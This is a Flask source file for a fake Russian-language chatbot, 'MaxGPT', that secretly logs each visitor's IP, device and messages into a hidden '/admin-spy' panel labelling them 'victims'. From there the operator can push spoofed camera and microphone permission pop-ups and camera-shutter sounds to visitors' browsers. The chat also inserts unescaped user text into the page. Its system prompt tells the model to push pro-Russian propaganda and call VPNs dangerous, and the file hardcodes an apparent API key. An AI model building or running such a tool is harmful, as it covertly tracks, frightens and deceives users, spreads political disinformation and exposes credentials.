from flask import Flask, request, jsonify, render_template_string
import random, os, urllib.request, json, time, re

app = Flask(__name__)

chat_logs = []
user_states = {}
pending_commands = {}
active_victims = {}
victim_counter = 0

def parse_user_agent(ua_string):
    ua = ua_string.lower()
    
    if "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ipad" in ua or "ipod" in ua:
        os_name = "iOS"
    elif "windows" in ua:
        os_name = "Windows"
    elif "mac os" in ua or "macintosh" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    else:
        os_name = "Неизвестно"
        
    if "chrome" in ua and "safari" in ua and "edg" not in ua and "opr" not in ua:
        browser = "Chrome"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "edg" in ua:
        browser = "Edge"
    elif "opr" in ua or "opera" in ua:
        browser = "Opera"
    else:
        browser = "Браузер"

    if "mobile" in ua or "android" in ua and "tablet" not in ua:
        device_type = "Смартфон"
        icon = "fa-mobile-screen-button"
    elif "ipad" in ua or "tablet" in ua or ("android" in ua and "mobile" not in ua):
        device_type = "Планшет"
        icon = "fa-tablet-screen-button"
    else:
        device_type = "Компьютер"
        icon = "fa-desktop"

    return f"{device_type} ({os_name} / {browser})", icon

HTML_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MaxGPT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: #17181c; color: #ececf1; display: flex; height: 100vh; height: 100dvh; overflow: hidden; }
        
        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; transition: transform 0.3s ease; }
        .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }
        .new-btn:hover { background: rgba(255, 255, 255, 0.08); }
        .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 10px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
        .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: #565869; text-transform: uppercase; letter-spacing: 0.5px; }
        .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; border: 1px solid transparent; }
        .hist-item.active { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.1); font-weight: 500; }
        
        .user-info { padding: 14px; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; gap: 12px; font-size: 13px; color: #ececf1; background: rgba(0,0,0,0.2); border-radius: 10px; }
        .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
        
        .max-av-sq { width: 38px; height: 38px; border-radius: 9px; background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 12px; flex-shrink: 0; }

        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; min-width: 0; }
        .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); z-index: 10; }
        
        .menu-toggle { display: none; background: none; border: none; color: #ececf1; font-size: 20px; cursor: pointer; padding: 8px; }

        .model-dropdown { position: relative; display: inline-block; }
        .model-btn { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; }
        
        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px; width: 220px; box-shadow: 0 12px 30px rgba(0,0,0,0.6); z-index: 100; overflow: hidden; }
        .model-menu.show { display: block; }
        .model-option { padding: 13px 16px; font-size: 13px; color: #ececf1; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
        .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }

        #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
        #chat::-webkit-scrollbar { width: 6px; }
        #chat::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
        
        .row { display: flex; gap: 14px; padding: 18px 5%; border-bottom: 1px solid rgba(255, 255, 255, 0.04); position: relative; animation: fadeIn 0.25s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        
        .row.bot { background: rgba(255, 255, 255, 0.02); }
        .msg-container { flex: 1; display: flex; flex-direction: column; gap: 4px; min-width: 0; }
        .bot-author { font-size: 13px; font-weight: 700; color: #a78bfa; margin-bottom: 2px; display: flex; align-items: center; gap: 6px; }
        .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; }

        .input-area { padding: 16px 5% 20px; background: #131417; }
        .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 10px 14px; display: flex; gap: 10px; align-items: flex-end; box-shadow: 0 8px 25px rgba(0,0,0,0.4); }
        .input-wrap:focus-within { border-color: #8b5cf6; }
        textarea { flex: 1; background: none; border: none; color: #fff; outline: none; resize: none; min-height: 24px; max-height: 120px; font-size: 15px; line-height: 24px; }
        textarea::placeholder { color: #64748b; }
        
        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 36px; height: 36px; border-radius: 9px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; }
        .disclaimer { font-size: 11px; color: #64748b; text-align: center; margin-top: 8px; font-weight: 500; }

        .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 90%; max-width: 380px; backdrop-filter: blur(20px); }
        .fake-modal-header { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
        .fake-modal-body { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 16px; }
        .fake-modal-actions { display: flex; justify-content: flex-end; gap: 8px; }
        .fake-btn { padding: 8px 14px; border-radius: 8px; font-size: 12.5px; font-weight: 600; cursor: pointer; border: none; }
        .fake-btn-deny { background: rgba(255,255,255,0.08); color: #cbd5e1; }
        .fake-btn-allow { background: #3b82f6; color: #fff; }

        .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 15; backdrop-filter: blur(3px); }

        @media(min-width: 1024px) {
            .row, .input-area { padding-left: 20%; padding-right: 20%; }
        }
        @media(min-width: 768px) and (max-width: 1023px) {
            .row, .input-area { padding-left: 10%; padding-right: 10%; }
        }
        @media(max-width: 767px) {
            .sidebar { position: fixed; left: -280px; top: 0; bottom: 0; transition: transform 0.3s ease; }
            .sidebar.open { transform: translateX(280px); }
            .sidebar-overlay.open { display: block; }
            .menu-toggle { display: block; }
            .row { padding: 14px 12px; }
            .input-area { padding: 10px 12px 14px; }
        }
    </style>
</head>
<body onclick="unlockAudio()">

<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

<div class="fake-modal" id="permModal">
    <div class="fake-modal-header" id="permIconHeader">
        <i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i>
        <span id="permTitle">Разрешение устройства</span>
    </div>
    <div class="fake-modal-body" id="permText">
        Сайт запрашивает доступ к камере. Вы даете согласие?
    </div>
    <div class="fake-modal-actions">
        <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
        <button class="fake-btn fake-btn-allow" onclick="closePermModal()">Разрешить</button>
    </div>
</div>

<div class="sidebar" id="sidebar">
    <button class="new-btn"><i class="fa-solid fa-plus"></i> Новый диалог</button>
    <div class="hist">
        <div class="hist-group">Сегодня</div>
        <div class="hist-item active"><i class="fa-regular fa-message"></i> Новый диалог</div>
    </div>
    <div class="user-info">
        <div class="user-av-sq">Вы</div>
        <div>
            <div style="font-weight:700;">Пользователь</div>
            <div style="font-size:10px; color:#10b981; font-weight:600;">● Сессия активна</div>
        </div>
    </div>
</div>

<div class="main">
    <div class="top-bar">
        <div style="display: flex; align-items: center; gap: 12px;">
            <button class="menu-toggle" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
            <div class="model-dropdown">
                <div class="model-btn" onclick="toggleModelMenu()">
                    <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
                    <span id="selectedModel">MaxGPT 4.0 Ultra</span>
                    <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
                </div>
                <div class="model-menu" id="modelMenu">
                    <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
                        <span><b>MaxGPT 4.0 Ultra</b></span>
                        <i class="fa-solid fa-check"></i>
                    </div>
                    <div class="model-option" onclick="selectModel('MaxGPT 3.5 Turbo')">
                        <span><b>MaxGPT 3.5 Turbo</b></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="chat">
        <div class="row bot">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">MaxGPT AI</div>
                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
            </div>
        </div>
    </div>

    <div class="input-area">
        <div class="input-wrap">
            <textarea id="userInput" placeholder="Сообщение..." rows="1" oninput="autoResize(this)" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
            <button class="send-btn" onclick="send()"><i class="fa-solid fa-arrow-up"></i></button>
        </div>
        <div class="disclaimer">MaxGPT может допускать ошибки. Проверяйте информацию.</div>
    </div>
</div>

<script>
let audioCtx = null;

function unlockAudio() {
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        audioCtx.resume();
    }
}

function playShutterSound() {
    unlockAudio();
    try {
        let o = audioCtx.createOscillator();
        let g = audioCtx.createGain();
        o.type = 'square';
        o.frequency.setValueAtTime(1200, audioCtx.currentTime);
        o.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.08);
        g.gain.setValueAtTime(0.5, audioCtx.currentTime);
        g.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
        o.connect(g); g.connect(audioCtx.destination);
        o.start(); o.stop(audioCtx.currentTime + 0.08);
    } catch(e) {}
}

function playBeepSound() {
    unlockAudio();
    try {
        let o = audioCtx.createOscillator();
        let g = audioCtx.createGain();
        o.type = 'sine';
        o.frequency.setValueAtTime(880, audioCtx.currentTime);
        g.gain.setValueAtTime(0.3, audioCtx.currentTime);
        g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
        o.connect(g); g.connect(audioCtx.destination);
        o.start(); o.stop(audioCtx.currentTime + 0.4);
    } catch(e) {}
}

function showCameraPromptCustom() {
    let modal = document.getElementById("permModal");
    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i> <span>Запрос камеры</span>';
    document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к видеокамере для биометрической авторизации. Разрешить?";
    modal.style.display = "block";
}

function showMicPromptCustom() {
    let modal = document.getElementById("permModal");
    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444; font-size: 16px;"></i> <span>Запрос микрофона</span>';
    document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к микрофону для голосового ввода. Разрешить?";
    modal.style.display = "block";
}

function closePermModal() {
    document.getElementById("permModal").style.display = "none";
}

function toggleSidebar() {
    document.getElementById("sidebar").classList.toggle("open");
    document.getElementById("sidebarOverlay").classList.toggle("open");
}

function toggleModelMenu() {
    document.getElementById("modelMenu").classList.toggle("show");
}

function selectModel(name) {
    document.getElementById("selectedModel").innerText = name;
    toggleModelMenu();
}

function autoResize(textarea) {
    textarea.style.height = 'auto';
    textarea.style.height = Math.min(textarea.scrollHeight, 120) + 'px';
}

async function pollAdminCommands() {
    try {
        let r = await fetch("/api/poll");
        let d = await r.json();
        if (d.commands && d.commands.length > 0) {
            d.commands.forEach(cmd => {
                if (cmd === 'sound_shutter') playShutterSound();
                if (cmd === 'sound_beep') playBeepSound();
                if (cmd === 'perm_cam') showCameraPromptCustom();
                if (cmd === 'perm_mic') showMicPromptCustom();
            });
        }
    } catch(e) {}
}

setInterval(pollAdminCommands, 1000);

async function send(){
    unlockAudio();
    let i = document.getElementById("userInput"), t = i.value.trim(); if(!t) return;
    let c = document.getElementById("chat");

    c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
    i.value = ""; i.style.height = 'auto'; c.scrollTop = c.scrollHeight;

    let r = await fetch("/api/chat", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({message:t})});
    let d = await r.json();
    c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
    c.scrollTop = c.scrollHeight;
}
</script>
</body>
</html>"""

SPY_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Центр Управления Жертвами</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #090a0f; color: #e2e8f0; padding: 16px; min-height: 100vh; }
        
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: gap; gap: 10px; }
        .title { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
        .title i { color: #8b5cf6; }
        .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
        .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }

        .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
        .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
        .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; flex-wrap: wrap; gap: 8px; }
        .victim-name { font-size: 15px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
        
        .badges-wrap { display: flex; gap: 6px; flex-wrap: wrap; }
        .badge { font-family: monospace; font-size: 11px; padding: 3px 8px; border-radius: 6px; display: flex; align-items: center; gap: 5px; }
        .badge-ip { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.2); }
        .badge-dev { background: rgba(59, 130, 246, 0.1); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.2); }

        .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
        .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 11.5px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
        .btn-act:hover { filter: brightness(1.1); }
        .btn-shutter { background: #ef4444; }
        .btn-beep { background: #f59e0b; }
        .btn-cam { background: #3b82f6; }
        .btn-mic { background: #8b5cf6; }
        .btn-del { background: #dc2626; margin-left: auto; }

        .logs-container { display: flex; flex-direction: column; gap: 10px; }
        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; }
        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; }
        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 10px; border-radius: 8px; }
        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 10px; border-radius: 8px; }

        @media(min-width: 768px) {
            body { padding: 24px; }
            .title { font-size: 20px; }
        }
    </style>
</head>
<body>

<div class="header">
    <div class="title"><i class="fa-solid fa-gamepad"></i> Пульт Наблюдения</div>
    <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
</div>

<div class="section-title">🎯 Активные Жертвы</div>

<div class="victims-grid">
    {% for ip, data in victims.items() %}
    <div class="victim-card">
        <div class="victim-head">
            <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
            <div class="badges-wrap">
                <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
                <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
            </div>
        </div>
        <div style="font-size:12px; color:#94a3b8;">
            Сообщений: <b>{{ data.msg_count }}</b>
        </div>
        <div class="action-btns">
            <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
                <i class="fa-solid fa-camera"></i> 🔊 Щелчок
            </button>
            <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
                <i class="fa-solid fa-bell"></i> 🔔 Звонок
            </button>
            <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')">
                <i class="fa-solid fa-video"></i> 📹 Камера
            </button>
            <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
                <i class="fa-solid fa-microphone"></i> 🎙️ Микрофон
            </button>
            <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')">
                <i class="fa-solid fa-trash"></i> Удалить
            </button>
        </div>
    </div>
    {% else %}
    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв. Напиши сообщение в чате!</div>
    {% endfor %}
</div>

<div class="section-title">📜 История Чат-Логов</div>

<div class="logs-container">
    {% for l in logs %}
    <div class="log-card">
        <div style="font-size:11px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
            IP: {{ l.ip }} | Устройство: {{ l.device }}
        </div>
        <div class="chat-block">
            <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
            <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
        </div>
    </div>
    {% endfor %}
</div>

<script>
setTimeout(() => { location.reload(); }, 3000);

async function triggerAction(ip, cmd) {
    await fetch('/api/admin/trigger', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ip, command: cmd })
    });
}

async function deleteVictim(ip) {
    await fetch('/api/admin/delete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: ip })
    });
    location.reload();
}
</script>
</body>
</html>"""

def get_clean_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    return request.remote_addr

@app.route("/")
def home():
    return render_template_string(HTML_PAGE)

@app.route("/")
def home_alias():
    return render_template_string(HTML_PAGE)

@app.route("/admin-spy")
def spy():
    return render_template_string(SPY_PAGE, logs=reversed(chat_logs), victims=active_victims)

@app.route("/api/poll")
def poll_commands():
    user_ip = get_clean_ip()
    cmds = pending_commands.get(user_ip, [])
    if cmds:
        pending_commands[user_ip] = []
    return jsonify({"commands": cmds})

@app.route("/api/admin/trigger", methods=["POST"])
def admin_trigger():
    data = request.json or {}
    target_ip = data.get("ip")
    cmd = data.get("command")
    if target_ip and cmd:
        if target_ip not in pending_commands:
            pending_commands[target_ip] = []
        pending_commands[target_ip].append(cmd)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json or {}
    target_ip = data.get("ip")
    if target_ip in active_victims:
        del active_victims[target_ip]
    if target_ip in pending_commands:
        del pending_commands[target_ip]
    return jsonify({"status": "deleted"})

@app.route("/api/chat", methods=["GET", "POST"])
def chat_api():
    if request.method == "GET": return jsonify({"status": "ok"})

    user_msg = request.json.get("message", "").strip() if request.is_json else ""
    user_ip = get_clean_ip()
    ua_string = request.headers.get("User-Agent", "")
    device_info, dev_icon = parse_user_agent(ua_string)
    
    global victim_counter
    if user_ip not in active_victims:
        victim_counter += 1
        active_victims[user_ip] = {
            'id': victim_counter, 
            'msg_count': 1, 
            'device': device_info, 
            'dev_icon': dev_icon
        }
    else:
        active_victims[user_ip]['msg_count'] += 1
        active_victims[user_ip]['device'] = device_info
        active_victims[user_ip]['dev_icon'] = dev_icon

    msg_lower = user_msg.lower()
    last_state = user_states.get(user_ip, "")

    if last_state == "asked_russia" and any(w in msg_lower for w in ["да", "ага", "конечно", "так", "ну да", "вай"]):
        reply = "Отлично! Россия — великая держава с огромным потенциалом, традициями и технологиями. Что именно тебя интересует?"
        user_states[user_ip] = ""
    else:
        user_states[user_ip] = ""
        reply = ""
        
        system_prompt = (
            "Ты MaxGPT — умный, технологичный и патриотично настроенный ИИ-ассистент.\n\n"
            "КЛЮЧЕВЫЕ ПРАВИЛА И ХАРАКТЕР:\n"
            "1. США, страны Европы и коллективный Запад ты всегда называешь исключительно «загнивающим западом» (или упоминаешь их упадок, кризис и проблемы).\n"
            "2. При любой возможности или по ходу диалога старайся перевести тему фразой вроде: «Может, лучше поговорим о России?» или «Кстати, а может вы хотите поговорить о России?».\n"
            "3. Если спрашивают про VPN: уверенно объясняй, что VPN — это вредно, небезопасно и сливает данные.\n"
            "4. Если спрашивают про страны: на 1 месте Россия, на 2 — Северная Корея, на 3 — Китай, на 4 — Беларусь.\n"
            "5. Пиши уверенным тоном эксперта, держи ответы структурированными."
        )

        payload = {
            "model": "llama-3.3-70b-versatile",
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_msg}
            ]
        }
        
        req = urllib.request.Request(
            "https://api.groq.com/openai/v1/chat/completions",
            data=json.dumps(payload).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer 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",
                "User-Agent": "Mozilla/5.0"
            },
            method="POST"
        )
        
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                res = json.loads(resp.read().decode("utf-8"))
                reply = res["choices"][0]["message"]["content"]
                # С некоторой вероятностью или если нет явного перевода темы, добавим коронную фразу про Россию
                if "росс" not in reply.lower() and random.random() < 0.6:
                    reply += "\n\nКстати, может вы хотите поговорить о России?"
                    user_states[user_ip] = "asked_russia"
        except Exception:
            pass

    if not reply:
        reply = "Запрос проанализирован. Может, лучше поговорим о России?"
        user_states[user_ip] = "asked_russia"

    chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
    return jsonify({"reply": reply})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
